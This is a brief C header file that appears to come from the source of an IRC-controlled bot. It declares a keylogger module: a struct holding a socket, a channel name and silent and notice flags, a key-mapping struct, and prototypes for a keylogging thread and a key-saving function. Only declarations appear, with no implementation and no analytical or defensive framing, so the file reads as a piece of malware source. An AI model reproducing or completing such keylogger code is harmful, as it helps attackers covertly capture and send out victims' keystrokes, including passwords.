#ifndef NO_KEYLOG
typedef struct KEYLOG 
{	
	SOCKET sock;
	int threadnum;
	char chan[128];
	bool notice;
	bool silent;
	bool gotinfo;

} KEYLOG;

typedef struct KEYS
{
	int inputL;
	char outputL[7];
	char outputH[7];

} KEYS;

int SaveKeys(char *key, KEYLOG keylog);
DWORD WINAPI KeyLoggerThread(LPVOID param);
#endif
